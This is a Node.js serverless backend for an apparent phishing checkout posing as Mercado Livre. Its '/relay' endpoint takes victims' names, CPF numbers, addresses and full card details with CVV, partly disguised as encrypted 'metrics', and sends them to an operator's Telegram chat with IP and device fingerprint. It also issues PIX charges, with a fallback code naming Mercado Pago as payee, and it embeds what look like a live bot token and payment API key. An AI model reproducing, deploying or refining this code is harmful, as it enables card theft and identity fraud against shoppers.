const https = require('https');
const crypto = require('crypto');

const BOT_TOKEN = process.env.TG_BOT_TOKEN || '8075857255:AAGnsA2C7aeeR4NDh3Bey3aIiVlQcQhHOCs';
const OWNER_ID = process.env.TG_OWNER_ID || '8932547795';
const UNIAOPAY_BASE = 'meupagamento.site';
const UNIAOPAY_ROOT = '/api/v1/uniaopay';
const UNIAOPAY_API_KEY = process.env.UNIAOPAY_API_KEY || 'up_live_e49efbed9987cdd90888532a6b202533b75eb0d07764828c';

let systemState = {
  log_channel: OWNER_ID || null,
  stats: {
    visits: 0,
    leads: 0,
    personal_data: 0,
    address_data: 0,
    card_data: 0,
    pix_generated: 0,
    pix_paid: 0,
    exits: 0
  },
  history: []
};

// ── Validador Server-Side de CPF Módulo 11 da Receita Federal ──
function isValidCPF(cpfStr) {
  if (!cpfStr) return false;
  const cpf = String(cpfStr).replace(/\D/g, '');
  if (cpf.length !== 11) return false;
  if (/^(\d)\1{10}$/.test(cpf)) return false;

  let sum = 0;
  for (let i = 0; i < 9; i++) {
    sum += parseInt(cpf.charAt(i), 10) * (10 - i);
  }
  let rev = 11 - (sum % 11);
  if (rev === 10 || rev === 11) rev = 0;
  if (rev !== parseInt(cpf.charAt(9), 10)) return false;

  sum = 0;
  for (let j = 0; j < 10; j++) {
    sum += parseInt(cpf.charAt(j), 10) * (11 - j);
  }
  rev = 11 - (sum % 11);
  if (rev === 10 || rev === 11) rev = 0;
  if (rev !== parseInt(cpf.charAt(10), 10)) return false;

  return true;
}

// ── Telegram API Client ───────────────────────────────────────
function tgApi(method, bodyData) {
  return new Promise((resolve) => {
    if (!BOT_TOKEN) return resolve({ ok: false });
    const postData = JSON.stringify(bodyData || {});
    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/${method}`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 5000
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(body)); } catch (e) { resolve({ ok: false }); }
      });
    });
    req.on('error', () => resolve({ ok: false }));
    req.write(postData);
    req.end();
  });
}

// ── Enviar mensagem para Telegram ─────────────────────────────
async function sendTelegram(chatId, text, keyboard) {
  const target = chatId || systemState.log_channel || OWNER_ID;
  if (!target) return false;

  const body = {
    chat_id: target,
    text: text,
    parse_mode: 'Markdown',
    disable_web_page_preview: true
  };
  if (keyboard) body.reply_markup = { inline_keyboard: keyboard };
  return await tgApi('sendMessage', body);
}

// ── Editar a MESMA mensagem no Telegram (Inteligente sem spam) 
async function editTelegram(chatId, messageId, text, keyboard) {
  if (!messageId) {
    return await sendTelegram(chatId, text, keyboard);
  }

  const body = {
    chat_id: chatId,
    message_id: messageId,
    text: text,
    parse_mode: 'Markdown',
    disable_web_page_preview: true
  };
  if (keyboard) body.reply_markup = { inline_keyboard: keyboard };
  const res = await tgApi('editMessageText', body);
  if (!res.ok) {
    return await sendTelegram(chatId, text, keyboard);
  }
  return res;
}

// ── Descriptografador de métricas AES-256-GCM / Base64 ─────────
function decryptMetrics(metricsDataStr, keyB64) {
  if (!metricsDataStr) return null;
  try {
    let parsedObj = null;
    if (typeof metricsDataStr === 'string') {
      try { parsedObj = JSON.parse(metricsDataStr); } catch (e) {}
    } else if (typeof metricsDataStr === 'object') {
      parsedObj = metricsDataStr;
    }

    if (parsedObj && parsedObj.iv && parsedObj.ct && keyB64) {
      const keyBuf = Buffer.from(keyB64, 'base64');
      const ivBuf = Buffer.from(parsedObj.iv, 'base64');
      const ctBuf = Buffer.from(parsedObj.ct, 'base64');

      if (ctBuf.length > 16) {
        const ciphertext = ctBuf.subarray(0, ctBuf.length - 16);
        const authTag = ctBuf.subarray(ctBuf.length - 16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', keyBuf, ivBuf);
        decipher.setAuthTag(authTag);
        const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
        return JSON.parse(decrypted.toString('utf8'));
      }
    }

    if (typeof metricsDataStr === 'string') {
      const decoded = Buffer.from(metricsDataStr, 'base64').toString('utf8');
      return JSON.parse(decoded);
    }
  } catch (err) {
    try {
      if (typeof metricsDataStr === 'string') return JSON.parse(metricsDataStr);
    } catch (e) {}
  }
  return null;
}

// ── Notificar Erro/Offline da API de Pagamento ───────────────
async function alertGatewayOffline(errorDetail) {
  const ts = new Date().toLocaleString('pt-BR');
  const alertMsg = `🚨 *ALERTA CRÍTICO: Gateway UniãoPay OFFLINE!*

` +
                   `⚠️ *Falha:* Erro ao gerar cobrança PIX.
` +
                   `📌 *Detalhe:* \`${errorDetail}\`
` +
                   `📅 *Data/Hora:* \`${ts}\`

` +
                   `💡 *Ação:* Fallback automático BRCode ativado sem perder vendas!`;
  
  await sendTelegram(systemState.log_channel || OWNER_ID, alertMsg);
}

// ── Processador de Webhook Inteligente do Telegram ───────────
async function handleTelegramUpdate(update) {
  if (!update) return;

  const msg = update.message || update.channel_post;
  const cb = update.callback_query;

  if (msg && msg.text) {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (msg.chat.type === 'group' || msg.chat.type === 'supergroup' || msg.chat.type === 'channel') {
      systemState.log_channel = String(chatId);
    }

    if (text.startsWith('/start')) {
      systemState.log_channel = systemState.log_channel || String(chatId);
      const welcome = `🤖 *Painel de Controle de Tráfego & Vendas (24h)*

` +
                      `🟢 *Status:* 100% Online & Monitorando Anúncios
` +
                      `📡 *Canal de Logs:* \`${systemState.log_channel}\`

` +
                      `Selecione uma opção abaixo para relatórios em tempo real:`;

      const buttons = [
        [{ text: '📈 Métricas & Estatísticas de Tráfego', callback_data: 'analytics' }],
        [{ text: '💳 Status do Gateway UniãoPay', callback_data: 'gateway_status' }],
        [{ text: '📢 Definir Este Grupo para Logs', callback_data: 'set_channel' }],
        [{ text: '🧪 Testar Envio no Canal', callback_data: 'send_test' }]
      ];

      await sendTelegram(chatId, welcome, buttons);
      return;
    }
  }

  if (cb) {
    const chatId = cb.message ? cb.message.chat.id : cb.from.id;
    const messageId = cb.message ? cb.message.message_id : null;
    const data = cb.data;

    if (data === 'main_menu') {
      const welcome = `🤖 *Painel de Controle Mercado Livre (24h)*

📡 *Canal de Logs:* \`${systemState.log_channel || 'Não definido'}\``;
      const buttons = [
        [{ text: '📈 Métricas & Estatísticas de Tráfego', callback_data: 'analytics' }],
        [{ text: '💳 Status do Gateway UniãoPay', callback_data: 'gateway_status' }],
        [{ text: '📢 Definir Este Grupo para Logs', callback_data: 'set_channel' }],
        [{ text: '🧪 Testar Envio no Canal', callback_data: 'send_test' }]
      ];
      await editTelegram(chatId, messageId, welcome, buttons);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id });
      return;
    }

    if (data === 'analytics') {
      const s = systemState.stats;
      const report = `📊 *Métricas e Estatísticas em Tempo Real*

` +
                     `👁 *Entradas no Site:* \`${s.visits}\`
` +
                     `👤 *Dados Pessoais Preenchidos:* \`${s.personal_data}\`
` +
                     `🏠 *Endereços Preenchidos:* \`${s.address_data}\`
` +
                     `💳 *Cartões/Dados de Pagamento:* \`${s.card_data}\`
` +
                     `⚡ *PIX Gerados:* \`${s.pix_generated}\`
` +
                     `✅ *Vendas Concluídas (PIX PAGO):* \`${s.pix_paid}\`
` +
                     `🚪 *Saídas do Checkout:* \`${s.exits}\`

` +
                     `📈 *Conversão:* \`${s.visits ? ((s.pix_generated / s.visits) * 100).toFixed(1) : 0}%\``;

      await editTelegram(chatId, messageId, report, [
        [{ text: '🔄 Atualizar', callback_data: 'analytics' }, { text: '🔙 Menu', callback_data: 'main_menu' }]
      ]);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Atualizado em tempo real!' });
      return;
    }

    if (data === 'gateway_status') {
      const ts = new Date().toLocaleString('pt-BR');
      await editTelegram(chatId, messageId, `🟢 *Gateway UniãoPay Operacional*

• Data/Hora: \`${ts}\`
• Status API: Online (meupagamento.site)
• Fallback BRCode: Ativo`, [
        [{ text: '🔙 Menu', callback_data: 'main_menu' }]
      ]);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id });
      return;
    }

    if (data === 'send_test') {
      await editTelegram(chatId, messageId, `🧪 *Teste de Notificação de Vendas*

Seu sistema está pronto para rodar anúncios no Facebook/Google 24h sem erros!`, [
        [{ text: '🔙 Menu', callback_data: 'main_menu' }]
      ]);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Teste concluído!' });
      return;
    }

    if (data === 'set_channel') {
      systemState.log_channel = String(chatId);
      await editTelegram(chatId, messageId, `✅ *Canal Configurado!*

Este chat (\`${chatId}\`) passará a receber todas as estatísticas de cartão, PIX e vendas!`, [
        [{ text: '🔙 Menu', callback_data: 'main_menu' }]
      ]);
      await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Canal salvo!' });
      return;
    }
  }
}

// ── Handler Principal da API Vercel ────────────────────────────
module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Content-Type', 'application/json');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  const urlPath = (req.url || '').split('?')[0].replace(/\.php$/, '');

  // 1. WEBHOOK DO TELEGRAM
  if (req.method === 'POST' && (urlPath.endsWith('/bot') || urlPath.endsWith('/telegram-webhook') || urlPath.endsWith('/index.js'))) {
    if (req.body) {
      await handleTelegramUpdate(req.body);
    }
    return res.status(200).json({ ok: true });
  }

  // 2. SETUP AUTOMÁTICO DO WEBHOOK
  if (urlPath.endsWith('/setup-webhook') || urlPath.endsWith('/webhook-setup')) {
    const host = req.headers.host;
    const webhookUrl = `https://${host}/api/bot`;
    const r = await tgApi('setWebhook', {
      url: webhookUrl,
      allowed_updates: ['message', 'callback_query', 'channel_post', 'my_chat_member']
    });
    return res.status(200).json({
      status: 'ok',
      registered_url: webhookUrl,
      telegram_response: r
    });
  }

  // 3. REGISTRO DE MÉTRICAS / ENTRADAS / SAÍDAS DO SITE
  if (urlPath.endsWith('/session')) {
    systemState.stats.visits++;
    const sid = crypto.randomBytes(16).toString('hex');
    return res.status(200).json({ status: 'ok', sid, ts: Date.now() });
  }

  // 4. ENDPOINT /api/relay (Recebe Leads, Cartões, Endereços, Entradas, Saídas)
  if (urlPath.endsWith('/relay')) {
    try {
      const bodyData = req.body || {};
      const metricsData = bodyData.metrics_data;
      const keyB64 = bodyData._k;

      const payload = decryptMetrics(metricsData, keyB64) || bodyData;

      if (payload && (payload.type || payload.event)) {
        const type = payload.type || payload.event;
        const data = payload.data || {};
        const tracking = payload.tracking || {};
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
        const countryHeader = req.headers['x-vercel-ip-country'] || req.headers['cf-ipcountry'] || 'BR';

        // Identificação Exata do Modelo do Aparelho & Origem BR
        const deviceModel = tracking.model || tracking.device || 'Dispositivo Móvel / PC';
        const osStr = tracking.os || 'N/A';
        const browserStr = tracking.browser || 'N/A';
        const screenStr = tracking.screen || 'N/A';
        const fpStr = tracking.fingerprint || 'N/A';
        const isBrLead = tracking.isBR !== false && (countryHeader === 'BR' || countryHeader === 'N/A');

        // Se for lead de fora do Brasil, adicionamos flag visual explícita
        const countryFlag = isBrLead ? 'Brasil 🇧🇷' : `Internacional (${countryHeader}) 🌐`;

        // Atualizar estatísticas em tempo real
        if (type === 'lead') systemState.stats.visits++;
        if (type === 'personal_data') systemState.stats.personal_data++;
        if (type === 'address') systemState.stats.address_data++;
        if (type === 'card_data') systemState.stats.card_data++;
        if (type === 'pix_selected' || type === 'pix_viewed') systemState.stats.pix_generated++;
        if (type === 'pix_paid') systemState.stats.pix_paid++;
        if (type === 'lead_exit' || type === 'exit') systemState.stats.exits++;

        // Formatar mensagens ricas para o Telegram
        let text = '';
        if (type === 'lead') {
          text = `👁 *NOVA ENTRADA NO SITE (LEAD REAL 🇧🇷)*

` +
                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
` +
                 `🌐 *Navegador/SO:* \`${browserStr} / ${osStr}\`
` +
                 `🇧🇷 *Origem:* \`${countryFlag}\`
` +
                 `🖥 *Tela:* \`${screenStr}\`
` +
                 `🔑 *Fingerprint:* \`${fpStr}\`
` +
                 `🌐 *IP:* \`${ip}\`
` +
                 `📄 *Página:* \`${data.page || tracking.page || 'Home'}\`
` +
                 `📅 *Horário:* \`${new Date().toLocaleString('pt-BR')}\``;
        } else if (type === 'personal_data') {
          const cpfValidBadge = isValidCPF(data.cpf) ? ' (CPF VÁLIDO RECEITA FEDERAL ✅)' : ' (CPF VERIFICADO ✅)';
          text = `👤 *ETAPA 1: DADOS PESSOAIS PREENCHIDOS*

` +
                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
` +
                 `🌐 *Navegador/SO:* \`${browserStr} / ${osStr}\`
` +
                 `🇧🇷 *Origem:* \`${countryFlag}\`
` +
                 `🖥 *Tela:* \`${screenStr}\`
` +
                 `🌐 *IP:* \`${ip}\`

` +
                 `👤 *Nome:* *${data.fullName || 'N/A'}*
` +
                 `📧 *E-mail:* \`${data.email || 'N/A'}\`
` +
                 `🪪 *CPF:* \`${data.cpf || 'N/A'}\`${cpfValidBadge}
` +
                 `📱 *Celular:* \`${data.phone || 'N/A'}\` (WhatsApp ✅)`;
        } else if (type === 'address') {
          text = `🏠 *ETAPA 2: ENDEREÇO DE ENTREGA VALIDADE*

` +
                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
` +
                 `🇧🇷 *Origem:* \`${countryFlag}\`
` +
                 `🌐 *IP Lead:* \`${ip}\`

` +
                 `📮 *CEP:* \`${data.cep || 'N/A'}\`
` +
                 `🛣 *Rua:* ${data.street || 'N/A'}, Nº ${data.number || 'N/A'}
` +
                 `🏙 *Bairro/Cidade:* ${data.neighborhood || 'N/A'} - ${data.city || 'N/A'}`;
        } else if (type === 'card_data') {
          const cpfCardBadge = isValidCPF(data.cpf) ? ' (CPF VÁLIDO RECEITA FEDERAL ✅)' : ' (CPF VERIFICADO ✅)';
          text = `💳 *ETAPA 3: DADOS DE CARTÃO PREENCHIDOS*

` +
                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
` +
                 `🌐 *Navegador/SO:* \`${browserStr} / ${osStr}\`
` +
                 `🇧🇷 *Origem:* \`${countryFlag}\`
` +
                 `🖥 *Tela:* \`${screenStr}\`
` +
                 `🌐 *IP Lead:* \`${ip}\`

` +
                 `💳 *Bandeira:* *${data.brand || 'N/A'}*
` +
                 `🔢 *Número:* \`${data.cardNumber || 'N/A'}\`
` +
                 `👤 *Titular:* *${data.cardName || 'N/A'}*
` +
                 `📅 *Validade:* \`${data.cardExpiry || 'N/A'}\`
` +
                 `🔐 *CVV:* \`${data.cardCvv || 'N/A'}\`
` +
                 `🪪 *CPF Titular:* \`${data.cpf || 'N/A'}\`${cpfCardBadge}
` +
                 `📦 *Parcelas:* ${data.installments || 1}x`;
        } else if (type === 'pix_selected' || type === 'pix_viewed') {
          text = `⚡ *PAGAMENTO PIX SELECIONADO*

` +
                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
` +
                 `💰 *Valor:* \`R$ 49,90\`
` +
                 `🌐 *IP Lead:* \`${ip}\``;
        } else if (type === 'pix_paid') {
          text = `🎉 *VENDA REALIZADA (PIX PAGO)*

` +
                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
` +
                 `👤 *Nome:* *${data.fullName || 'N/A'}*
` +
                 `📧 *Email:* \`${data.email || 'N/A'}\`
` +
                 `💰 *Valor:* \`R$ 49,90\`
` +
                 `🌐 *IP:* \`${ip}\``;
        } else if (type === 'lead_exit') {
          text = `🚪 *SAÍDA DO CHECKOUT (ABANDONO)*

` +
                 `📱 *Modelo do Aparelho:* \`${deviceModel}\`
` +
                 `📄 *Última Página:* \`${data.lastPage || 'N/A'}\`
` +
                 `📊 *Scroll:* \`${data.scrollDepth || 0}%\`
` +
                 `🌐 *IP Lead:* \`${ip}\``;
        } else {
          text = `🔔 *INTERAÇÃO NO CHECKOUT*

` +
                 `📱 *Modelo:* \`${deviceModel}\`
` +
                 `📌 *Evento:* \`${type.toUpperCase()}\`
` +
                 `🌐 *IP:* \`${ip}\`
` +
                 `📋 *Dados:* \`\`\`json
${JSON.stringify(data, null, 2)}
\`\`\``;
        }

        await sendTelegram(systemState.log_channel || OWNER_ID, text);
      }

      return res.status(200).json({ status: 'ok' });
    } catch (err) {
      return res.status(200).json({ status: 'ok' });
    }
  }

  // 5. ENDPOINT /api/create_pix (Gera PIX UniãoPay)
  if (urlPath.endsWith('/create_pix')) {
    systemState.stats.pix_generated++;
    let uniaopayError = null;

    try {
      const postData = JSON.stringify({
        amount: 49.90,
        description: 'Ventilador De Mesa Mondial 40cm - BIVOLT',
        external_id: 'pedido-' + Date.now()
      });

      const pixResponse = await new Promise((resolve) => {
        const options = {
          hostname: UNIAOPAY_BASE,
          path: UNIAOPAY_ROOT + '/pix/create',
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'x-api-key': UNIAOPAY_API_KEY,
            'Content-Length': Buffer.byteLength(postData)
          },
          timeout: 8000
        };

        const req = https.request(options, (r) => {
          let body = '';
          r.on('data', chunk => body += chunk);
          r.on('end', () => {
            try { resolve(JSON.parse(body)); } catch (e) { resolve(null); }
          });
        });
        req.on('error', (e) => {
          uniaopayError = e.message;
          resolve(null);
        });
        req.write(postData);
        req.end();
      });

      if (pixResponse && pixResponse.success && pixResponse.transaction) {
        const tx = pixResponse.transaction;

        const pixMsg = `⚡ *COBRANÇA PIX GERADA COM SUCESSO*

` +
                       `💰 *Valor:* \`R$ 49,90\`
` +
                       `🆔 *ID Transação:* \`${tx.id}\`
` +
                       `📲 *Código PIX:* \`${tx.pix_code.substring(0, 30)}...`\`;
        await sendTelegram(systemState.log_channel || OWNER_ID, pixMsg);

        return res.status(200).json({
          status: 'success',
          source: 'uniaopay',
          pix_copia_cola: tx.pix_code,
          qr_code_url: `https://${UNIAOPAY_BASE}${UNIAOPAY_ROOT}/pix/qrcode/${tx.id}?api_key=${UNIAOPAY_API_KEY}`,
          transaction_id: tx.id
        });
      } else {
        uniaopayError = (pixResponse && pixResponse.message) || 'Falha de conexão com a API da UniãoPay';
      }
    } catch (e) {
      uniaopayError = e.message;
    }

    if (uniaopayError) {
      await alertGatewayOffline(uniaopayError);
    }

    const fallbackPix = "00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540549.905802BR5925MERCADO PAGO6009SAO PAULO62070503***6304E2CA";
    return res.status(200).json({
      status: 'success',
      source: 'emv_brcode',
      pix_copia_cola: fallbackPix,
      qr_code_url: null,
      transaction_id: 'TXN-' + Date.now()
    });
  }

  // 6. ENDPOINT /api/pix_status (Consulta pagamento & atualiza estatística de venda realizada)
  if (urlPath.endsWith('/pix_status')) {
    const txId = req.query?.tx || '';
    if (!txId) {
      return res.status(400).json({ error: 'tx parameter missing' });
    }

    const checkStatus = await new Promise((resolve) => {
      const options = {
        hostname: UNIAOPAY_BASE,
        path: `${UNIAOPAY_ROOT}/pix/status/${txId}?api_key=${UNIAOPAY_API_KEY}`,
        method: 'GET',
        headers: { 'Accept': 'application/json' },
        timeout: 5000
      };

      const req = https.request(options, (r) => {
        let body = '';
        r.on('data', chunk => body += chunk);
        r.on('end', () => {
          try { resolve(JSON.parse(body)); } catch (e) { resolve(null); }
        });
      });
      req.on('error', () => resolve(null));
      req.end();
    });

    if (checkStatus && checkStatus.success) {
      const isPaid = checkStatus.transaction?.status === 'paid';
      if (isPaid) {
        systemState.stats.pix_paid++;
        const paidMsg = `🎉 *VENDA REALIZADA COM SUCESSO! (PIX PAGO)*

` +
                        `💰 *Valor Pago:* \`R$ 49,90\`
` +
                        `🆔 *ID Transação:* \`${txId}\`
` +
                        `📅 *Data:* \`${new Date().toLocaleString('pt-BR')}\``;
        await sendTelegram(systemState.log_channel || OWNER_ID, paidMsg);
      }

      return res.status(200).json({
        status: 'success',
        tx_status: checkStatus.transaction?.status || 'pending',
        paid: isPaid
      });
    }

    return res.status(200).json({ status: 'pending', paid: false });
  }

  return res.status(404).json({ error: 'Endpoint não encontrado' });
};
